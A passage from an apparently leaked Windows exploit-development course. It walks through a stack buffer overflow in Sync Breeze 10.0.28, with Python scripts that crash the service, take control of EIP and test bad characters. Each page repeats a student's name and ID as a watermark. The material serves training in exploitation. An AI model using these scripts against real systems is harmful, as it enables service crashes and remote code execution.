Listing 50 - Using pseudo registers during calculations 
Pseudo registers allow us to store values or split up computations, and we’ll use them in later 
modules. 
2.6 Wrapping Up 
This concludes the WinDbg and x86 architecture introductory module. We covered multiple 
commands and techniques that will be useful throughout this course. 
Although WinDbg is relatively unintuitive, it is extremely powerful and proficiency is required for 
the rest of this course. Carefully review the steps in this module and master each exercise. Also, 
learn to rely on .hh, the built-in manual command, and refer to the cheat sheet51 for a quick 
review. 
 
51 (Windbg, 2009), http://windbg.info/doc/1-common-cmds.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
57 
 
3 Exploiting Stack Overflows 
In this module, we will examine a buffer overflow52 in the Sync Breeze application.53 We’ll learn 
how to use this memory corruption vulnerability to control the execution flow of an application. 
We will begin with a simple proof of concept that causes the application to crash. Afterwards, we 
will slowly expand the proof of concept to gain control of the CPU registers, eventually 
manipulating memory to gain reliable remote code execution. 
In order to develop an exploit for this type of vulnerability, we need to understand the conditions 
that make a stack overflow attack possible. Before we tackle the application, we will cover the 
foundational concepts around this vulnerability class by analyzing a very basic example. 
3.1 Stack Overflows Introduction 
The following listing presents a very basic C source code for an application vulnerable to a buffer 
overflow. 
#include <stdio.h> 
#include <string.h> 
 
int main(int argc, char *argv[]) 
{ 
    char buffer[64]; 
 
    if (argc < 2) 
    { 
        printf("Error - You must supply at least one argument\n"); 
         
        return 1; 
    } 
     
    strcpy(buffer, argv[1]); 
     
  return 0; 
} 
Listing 51 - A vulnerable C function 
Even if you have never dealt with C code before, it should be fairly easy to understand the logic 
shown in the listing above. First of all, it’s worth noting that in C, the main function is treated the 
same as every other function; it can receive arguments, return values to the calling program, etc. 
The only difference is that it is “called” by the operating system itself when the process starts. 
In this case, the main function first defines a character array named buffer that can fit up to 64 
characters. Since this variable is defined within a function, the C compiler54 will treat it as a local 
 
52 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Buffer_overflow 
53 (Flexense, 2019), http://www.syncbreeze.com/ 
54 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Compiler 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
58 
variable55 and will reserve space (64 bytes) for it on the stack. Specifically, this memory space will 
be reserved within the main function stack frame during its execution when the program runs. 
As the name suggests, local variables have a local scope,56 which means they 
are only accessible within the function or block of code they are declared in. In 
contrast, global variables57 are stored in the program .data section, a different 
memory area of a program that is globally accessible by all the application code. 
The program then proceeds to copy (strcpy58) the content of the given command-line argument 
(argv[1]59) into the buffer character array. Note that the C language does not natively support 
strings as a data type. At a low level, a string is a sequence of characters terminated by a null 
character (‘\0’), or put another way, a one-dimensional array of characters. 
Finally, the program terminates its execution and returns a zero (standard success exit code) to 
the operating system. 
When we call this program, we will pass command-line arguments to it. The main function 
processes these arguments with the help of the two parameters, argc and argv, which represent 
the number of the arguments passed to the program (passed as an integer) and an array of 
pointers to the argument “strings” themselves, respectively. 
If the argument passed to the main function is 64 characters or less, this program will work as 
expected and will exit normally. However, since there are no checks on the size of the input, if the 
argument is longer, say 80 bytes, part of the stack adjacent to the target buffer will be overwritten 
by the remaining 16 characters, overflowing the array boundaries. This is illustrated in Figure 14. 
 
55 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Local_variable 
56 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Scope_(computer_science) 
57 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Global_variable 
58 (linux.die.net), https://linux.die.net/man/3/strcpy 
59 (GBdirect), https://publications.gbdirect.co.uk//c_book/chapter10/arguments_to_main.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
59 
 
Figure 14: Stack layout before and after copy 
The effects of this memory corruption depend on multiple factors including the size of the 
overflow and the data included in that overflow. As shown in the above figure, if the overflow is 
large enough, the attacker might be able to overwrite the return address of the vulnerable function 
on the stack with controlled data. 
Recalling function return mechanics concepts from a previous module, we know that when a 
function ends its execution, the return address is taken from the stack and used to restore the 
execution flow to the calling function. In our basic example, when this happens for the main 
function, the overwritten return address will be popped into the Extended Instruction Pointer (EIP) 
CPU register. 
At this point, the CPU will try to read the next instruction from 0x41414141 (0x41 is the 
hexadecimal representation of the ASCII character “A”). Since this is not a valid address in the 
process memory space, the CPU will trigger an access violation, crashing the application. 
Once again, it’s important to keep in mind that the EIP register is used by the CPU to direct code 
execution at the assembly level. Therefore, obtaining reliable control of EIP would allow us to 
execute any assembly code we want and eventually shellcode60 to obtain a reverse shell in the 
context of the vulnerable application. We will follow this through to completion later in this 
module with the Sync Breeze buffer overflow. 
 
60 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Shellcode 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
60 
3.2 Installing the Sync Breeze Application 
Now that we understand the concepts behind buffer overflows, let’s develop our test case. 
First, we need to install the syncbreezeent_setup_v10.0.28 application located in the 
C:\Installers\stack_overflow\ folder; we will accept all the default installation options during this 
process. After installation is complete, we will tick the box that says Run Sync Breese Enterprise 
10.0.28 as shown in Figure 15: 
 
Figure 15: Finishing the Sync Breeze installation 
Next, let’s enable the web server by clicking the Options button as shown in Figure 16: 
 
Figure 16: Accessing Sync Breeze options 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
61 
 
Next, we select Server from the left side menu and tick the Enable Web Server on Port: option, 
leaving the default port as 80. 
 
Figure 17: Enabling Sync Breeze Web Server 
This application will crash multiple times during our exploit development, so we need the ability to 
quickly restart it. This can be done from the Services.msc utility by restarting the Sync Breeze 
Enterprise service as an Administrator. 
3.2.1.1 Exercise 
1. 
Install the Sync Breeze application on your Windows 10 student VM. 
3.3 Crashing the Sync Breeze Application 
In 2017, a buffer overflow vulnerability was discovered in the login mechanism of Sync Breeze 
version 10.0.28. Specifically, the username field of the HTTP POST login request could be used to 
crash the application.61 Since working credentials are not required to trigger the vulnerability, it is 
considered a pre-authentication buffer overflow. 
Generally speaking, there are three primary techniques for identifying flaws in applications. 
Source code review is likely the easiest if it is available. If it is not, we can use reverse engineering 
techniques62 or fuzzing63 to find vulnerabilities. Later in this course, we will focus on reverse 
engineering but since this vulnerability is public and an initial proof of concept (PoC) is available 
on the Exploit Database website, we will for now focus only on the exploitation of the target 
application. 
 
61 (Exploit-DB - Sync Breeze Enterprise 10.0.28 - Denial of-Service, 2017), https://www.exploit-db.com/exploits/43200 
62 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Reverse_engineering 
63 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Fuzzing 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
62 
Let’s start by copying the Python proof of concept to our Kali machine: 
#!/usr/bin/python 
import socket 
import sys 
 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 800 
  inputBuffer = b"A" * size 
  content = b"username=" + inputBuffer + b"&password=A" 
 
  buffer = b"POST /login HTTP/1.1\r\n" 
  buffer += b"Host: " + server.encode() + b"\r\n" 
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 
Firefox/52.0\r\n" 
  buffer += b"Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" 
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n" 
  buffer += b"Referer: http://10.11.0.22/login\r\n" 
  buffer += b"Connection: close\r\n" 
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n" 
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n" 
  buffer += b"\r\n" 
  buffer += content 
 
  print("Sending evil buffer...") 
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  s.connect((server, port)) 
  s.send(buffer) 
  s.close() 
   
  print("Done!") 
   
except socket.error: 
  print("Could not connect!") 
Listing 52 - stack_overflow_0x01.py: Triggering the initial crash 
The code in Listing 52 crafts a login HTTP POST request in which we specify a username of 800 
“A” characters. The code then connects on port 80 to the remote server passed as an argument 
to the script, and sends the request. 
In order to verify that this code actually works as expected, we will first attach our debugger to the 
target process. This will allow us to inspect the target process memory and CPU registers in case 
the application crashes. 
Since the syncbrs.exe application runs as a service with Local System account privileges, we will 
need to run WinDbg with administrator permissions. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
63 
 
Figure 18: Sync Breeze Enterprise Service Properties 
Once our debugger is attached, we’ll issue the g command to allow the application to continue. 
We can then run our script from the Kali machine. 
kali@kali:~$ python stack_overflow_0x01.py 192.168.120.10 
Sending evil buffer... 
Done! 
Listing 53 - Running the initial proof of concept 
When we execute our script, the application crashes as expected with an access violation. We 
can examine the EIP register in WinDbg and observe that it is overwritten by four 0x41 bytes, 
which are part of our username string, the 800-byte “A” buffer. 
(ae8.104): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000001 ebx=00000000 ecx=00263a54 edx=00000358 esi=0025bf86 edi=00a47420 
eip=41414141 esp=0176745c ebp=0025c6b8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
41414141 ??              ??? 
Listing 54 - Inspecting the initial crash in WinDbg 
This is a good first step. We confirmed that sending an 800 byte username will crash the 
application. In the next sections we’ll escalate from a crash to remote code execution. 
3.3.1.1 Exercise 
1. 
Write a standalone script to replicate the crash. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
64 
3.4 Win32 Buffer Overflow Exploitation 
Developing a full working exploit from an application crash and successfully obtaining a remote 
shell is very exciting. As mentioned before, the first goal is to gain control of the EIP register as 
this will allow us to control the execution flow of the target application. Next, we’ll have to find a 
way to inject some malicious code like a reverse shell in the target process memory space and 
redirect the execution to it. 
3.4.1 A Word About DEP, ASLR, and CFG 
We need to understand the protective mechanisms that make control of the EIP pointer more 
difficult to obtain or exploit. While the Sync Breeze software was compiled without any of these 
security mechanisms, we will be facing some of them in later modules. 
Microsoft implements Data Execution Prevention (DEP),64 Address Space Layout Randomization 
(ASLR),65 and Control Flow Guard (CFG).66 
DEP is a set of hardware and software technologies that perform additional memory checks to 
help prevent malicious code from running on a system. DEP helps prevent code execution from 
data pages67 by raising an exception when attempts are made to do so. 
ASLR randomizes the base addresses of loaded applications and DLLs every time the operating 
system is booted. On older Windows operating systems, like Windows XP where ASLR is not 
implemented, all DLLs are loaded at the same memory address every time, which makes 
exploitation easier. When coupled with DEP, ASLR provides a very strong mitigation against 
exploitation. 
Finally, CFG is Microsoft’s implementation of control-flow integrity. This mechanism performs 
validation of indirect code branching such as a call instruction that uses a register as an operand 
rather than a memory address such as CALL EAX. The purpose of this mitigation is to prevent the 
overwrite of function pointers in exploits. 
As previously mentioned, Sync Breeze was compiled without any of these security mechanisms, 
making the exploitation process much easier. This provides a great opportunity for us to start 
learning the exploitation process without having to worry about various mitigations. 
3.4.2 Controlling EIP 
Gaining control of the EIP register is a crucial step while exploiting memory corruption 
vulnerabilities. We can use the EIP register to control the direction or flow of the application. 
However, right now we only know that a section of our buffer of A’s overwrote the EIP. 
Before we can load a valid destination address into the EIP and control the execution flow, we 
need to know which part of our buffer is landing in EIP. 
 
64 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention 
65 (Michael Howard, 2006), https://blogs.msdn.microsoft.com/michael_howard/2006/05/26/address-space-layout-randomization-in-
windows-vista/ 
66 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard 
67 (Wikipedia, 2019),https://en.wikipedia.org/wiki/Page_(computer_memory) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
65 
There are two common ways to find this information. First, we might attempt a binary tree 
analysis. To do this, instead of 800 A’s, we’ll send 400 A’s and 400 B’s. If EIP is overwritten by B’s, 
we know the four bytes are in the second half of the buffer. We can then change the 400 B’s to 
200 B’s and 200 C’s, and send the buffer again. We can continue splitting the specific buffer until 
we reach the exact four bytes that overwrite EIP. 
The second, faster way to identify the location of these four bytes starts with inserting a long 
string made of non-repeating 4-byte chunks as our input. Then, when the EIP is overwritten with 
four bytes from our string, we can use that unique sequence to pinpoint the exact location. Let’s 
try this technique to get a better understanding of it. 
To generate a non-repeating string, we’ll use a script from the Metasploit Framework68 called 
pattern_create.rb. 
As described by its authors, the Metasploit Framework, maintained by Rapid7,69 is “an advanced 
platform for developing, testing, and using exploit code”. 
The Metasploit project initially started off as a portable network game70 and has 
evolved into a powerful tool for penetration testing, exploit development, and 
vulnerability research. The Framework has slowly but surely become the leading 
free exploit collection and development framework for security auditors. 
Metasploit is frequently updated with new exploits and is constantly being 
improved and further developed by Rapid7 and the security community. 
The pattern_create.rb script is located in /usr/share/metasploit-framework/tools/exploit/, but we 
can run it from any location in Kali with msf-pattern_create as shown below: 
kali@kali:~$ locate pattern_create 
/usr/bin/msf-pattern_create 
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 
 
kali@kali:~$ msf-pattern_create -h 
Usage: msf-pattern_create [options] 
Example: msf-pattern_create -l 50 -s ABC,def,123 
Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf 
 
Options: 
    -l, --length <length>            The length of the pattern 
    -s, --sets <ABC,def,123>         Custom Pattern Sets 
    -h, --help                       Show this message 
Listing 55 - Location and help usage for msf-pattern_create 
To set the length of the string we want to create, we’ll pass the -l parameter and the length (800): 
 
68 (The Metasploit Framework), https://www.metasploit.com/ 
69 (Rapid7), https://www.rapid7.com/ 
70 (ThreatPost, 2010), https://threatpost.com/qa-hd-moore-metasploit-disclosure-and-ethics-052010/73998/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
66 
kali@kali:~$ msf-pattern_create -l 800 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac
8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A
f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5
Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak 
... 
Listing 56 - Creating a unique string 
This generates our string; next, we’ll update our Python script by replacing the existing buffer with 
our new string: 
#!/usr/bin/python 
import socket 
import sys 
 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 800 
  #inputBuffer = "A" * size 
  inputBuffer = 
b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af
6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
i5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3
Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao
2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0A
r1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw
8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6A
z7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba" 
  content = b"username=" + inputBuffer + b"&password=A" 
... 
Listing 57 - stack_overflow_0x02.py: Overwriting EIP with a unique string 
When we restart Sync Breeze and run our exploit again, we’ll notice that EIP contains a new string, 
shown below in Listing 58: 
(1600.174): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000001 ebx=00000000 ecx=00653b14 edx=00000358 esi=0064c006 edi=00a27420 
eip=42306142 esp=0032745c ebp=0064c6b8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
42306142 ??              ??? 
Listing 58 - Obtaining the EIP overwrote value in WinDbg 
The EIP register has been overwritten with 42306142 (hexadecimal value of “B0aB”). Knowing 
this, we can use pattern_offset.rb (the companion to pattern_create.rb), to determine the offset of 
these four bytes in our string. In Kali, this script can also be run from any location with msf-
pattern_offset. 
To find the offset where the EIP overwrite happens, we can use -l to specify the length of our 
original string and -q to specify the bytes in the EIP (42306142): 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
67 
kali@kali:~$ msf-pattern_offset -l 800 -q 42306142 
[*] Exact match at offset 780 
Listing 59 - Finding the offset 
The msf-pattern_offset script reports that these four bytes are located at offset 780 of the 800-
byte pattern. Let’s update our proof of concept with this new information. We can send 780 “A” 
characters, 4 “B” characters and 16 “C” characters. Our goal is to have four B’s (0x42424242) land 
precisely in the EIP register: 
#!/usr/bin/python 
import socket 
import sys 
 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 800 
   
  filler = b"A" * 780 
  eip = b"B" * 4 
  buf = b"C" * 16 
  inputBuffer = filler + eip + buf 
  content = b"username=" + inputBuffer + b"&password=A" 
... 
Listing 60 - stack_overflow_0x03.py: Controlling the EIP overwrite 
When the web server crashes this time, the resulting buffer is perfectly structured. The EIP now 
contains our four B’s (0x42424242) as shown in Listing 61: 
(558.104): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000001 ebx=00000000 ecx=001f2e44 edx=00000358 esi=001ec1c6 edi=00a87420 
eip=42424242 esp=0056745c ebp=001ec6b8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
42424242 ??              ??? 
Listing 61 - EIP is overwritten with the expected value 
We now have complete control over the EIP register and therefore control over the execution flow 
of Sync Breeze! However, to reach our objective, we need to replace our 0x42424242 placeholder 
and redirect the application flow to a valid address pointing to the code we want to execute. 
3.4.2.1 Exercises 
1. 
Determine the offset within the input buffer to successfully control EIP. 
2. 
Update your standalone script, placing a unique value into EIP to ensure your offset is 
correct. 
3.4.3 Locating Space for Our Shellcode 
At this point, we know that we can place any address in EIP, but we do not know what address to 
use. Before we choose an address, we need to understand where we can redirect the execution 
flow. First, let’s focus on the executable code we want the target to execute, and more 
importantly, understand where this code fits in memory. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
68 
Ideally, our goal is to execute code of our choice on the target. We can achieve this using a 
reverse shell or any shellcode we want; but we need to include the shellcode as part of the input 
buffer that triggers the crash in order to inject it into the target process memory space. 
Shellcode is a collection of assembly instructions that, when executed, perform 
the desired action of the attacker. This typically involves opening a reverse or 
bind shell, but may also include more complex actions. 
We will use the Metasploit Framework to generate our shellcode payload. Looking back at the 
registers from our last crash in Listing 62, we notice that the ESP register points to our buffer of 
C’s. 
0:001> r 
eax=00000001 ebx=00000000 ecx=001f2e44 edx=00000358 esi=001ec1c6 edi=00a87420 
eip=42424242 esp=0056745c ebp=001ec6b8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
42424242 ??              ??? 
 
0:001> dds esp L3 
0056745c  43434343 
00567460  43434343 
00567464  43434343 
Listing 62 - Inspecting the stack pointer at the time of the crash 
Since we can easily access this location at crash time through the address stored in ESP, this 
seems like a convenient location for our shellcode. 
Closer inspection of the stack at crash time (Listing 62) reveals that the first four C’s from our 
buffer landed at address 0x00567458. The current ESP value is 0x0056745c, which points to the 
next four C’s from our buffer: 
0:001> r 
eax=00000001 ebx=00000000 ecx=001f2e44 edx=00000358 esi=001ec1c6 edi=00a87420 
eip=42424242 esp=0056745c ebp=001ec6b8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
42424242 ??              ??? 
 
0:001> dds esp -10 L8 
0056744c  41414141 
00567450  41414141 
00567454  42424242 
00567458  43434343 
0056745c  43434343 
00567460  43434343 
00567464  43434343 
00567468  00a7ba00 
Listing 63 - Further inspection of the stack pointer at the time of the crash 
A standard reverse shell payload requires approximately 350-400 bytes of space. The listing 
above clearly shows that there are only 16 C’s in the buffer, which isn’t nearly enough space for 
our shellcode. We can try to get around this problem by increasing the buffer length in our exploit 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
69 
from 800 bytes to 1500 bytes, then checking to ensure this allows enough space for our 
shellcode without breaking the buffer overflow condition or changing the nature of the crash. 
Depending on the application and the type of vulnerability, there may be 
restrictions on the length of our input. In some cases, increasing the length of a 
buffer may result in a completely different crash since the larger buffer 
overwrites additional data on the stack that is used by the target application. 
For this update, we will add “D” characters as a placeholder for our shellcode: 
#!/usr/bin/python 
import socket 
import sys 
 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 800 
   
  filler = b"A" * 780 
  eip = b"B" * 4 
  offset = b"C" * 4 
  shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset)) 
  inputBuffer = filler + eip + offset + shellcode 
  content = b"username=" + inputBuffer + b"&password=A" 
... 
Listing 64 - stack_overflow_0x04.py: Increasing the buffer size 
Running this proof of concept, we’ll observe a similar crash in the debugger. This time however, 
the ESP is pointing to the “D” characters (0x44 in hexadecimal) acting as a placeholder for our 
shellcode, as shown in Listing 65: 
(a78.a24): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000001 ebx=00000000 ecx=0022121c edx=00000358 esi=0021c106 edi=00ad7420 
eip=42424242 esp=0056745c ebp=0021c6b8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
42424242 ??              ??? 
 
0:001> dds esp - 8 L7 
00567454  42424242 
00567458  43434343 
0056745c  44444444 
00567460  44444444 
00567464  44444444 
00567468  44444444 
0056746c  44444444 
Listing 65 - ESP points to a different address value 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
70 
This handy trick has provided us with significantly more space to work with - specifically, 712 
bytes of free space for our shellcode. 
0:001> dds esp L4 
0056745c  44444444 
00567460  44444444 
00567464  44444444 
00567468  44444444 
0:001> dds esp+2c0 L4 
0056771c  44444444 
00567720  44444444 
00567724  00000000 
00567728  00000000 
0:001> ? 00567724 - 0056745c 
Evaluate expression: 712 = 000002c48 
Listing 66 - Calculating the available shellcode space 
It is important to note that the address of ESP changes every time we run the exploit, but still 
points to our buffer. We’ll address this in a following section, but first we have another hurdle to 
overcome. 
3.4.3.1 Exercises 
1. 
Update your standalone script and increase the size of your buffer to fit a reverse shell 
payload. 
2. 
Run the updated script and ensure that the instruction pointer is still under your control. 
3.4.4 Checking for Bad Characters 
Depending on the application, vulnerability type, and protocols in use, there may be certain 
characters that are considered “bad” and should not be used in our buffer, return address, or 
shellcode. A character is considered bad if using it prevents or changes the nature of our crash. 
Some characters can also be considered bad because they end up mangled in memory. One 
example of a common bad character is the null byte (0x00). 
The null byte is considered a bad character because it is used to terminate a 
string in low-level languages such as C/C++. This causes the string copy 
operation to end, effectively truncating our buffer at the first instance of a null 
byte. 
Because we are sending the exploit as part of an HTTP POST request, we should also avoid the 
return character 0x0D, which signifies the end of an HTTP field (the username in this case). 
We should always check for bad characters during the exploit development process. One way to 
determine which characters are bad for a particular exploit is to send all possible characters - 
from 0x00 to 0xFF - as part of our buffer, and observe how the application reacts to these 
characters after the crash. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
71 
We can repurpose our proof of concept to do this by replacing our D’s with all possible hex 
characters except 0x00 (Listing 67): 
#!/usr/bin/python 
import socket 
import sys 
 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 800 
   
  filler = b"A" * 780 
  eip = b"B" * 4 
  offset = b"C" * 4 
  badchars = ( 
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" 
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" 
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" 
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" 
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" 
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" 
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" 
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" 
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 
  #shellcode = "D" * (1500 - len(filler) - len(eip) - len(offset)) 
  inputBuffer = filler + eip + offset + badchars 
... 
Listing 67 - stack_overflow_0x05.py: Sending all possible hex characters 
Now let’s execute our proof of concept. When the application crashes, we can use the db 
command to dump the bytes from the ESP register and verify if any characters have been 
mangled or truncated our buffer (Listing 68): 
0:008> db esp - 10 L20 
0149744c  41 41 41 41 41 41 41 41-42 42 42 42 43 43 43 43  AAAAAAAABBBBCCCC 
0149745c  01 02 03 04 05 06 07 08-09 00 a6 00 60 bd a6 00  ............`... 
Listing 68 - Verifying the hex characters in memory 
From the output above, we’ll observe that the hex values 0x01 through 0x09 made it into the 
stack memory buffer. There is no sign, however, of the next character, 0x0A, which should be at 
address 0x01497465. 
This is not surprising because the 0x0A character translates to a line feed, which terminates an 
HTTP field, similar to a carriage return. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
72 
Let’s remove the 0x0A character from our test script and resend the payload. The resulting buffer 
terminates after the hex value 0x0C this time (Listing 69), indicating that the return character 
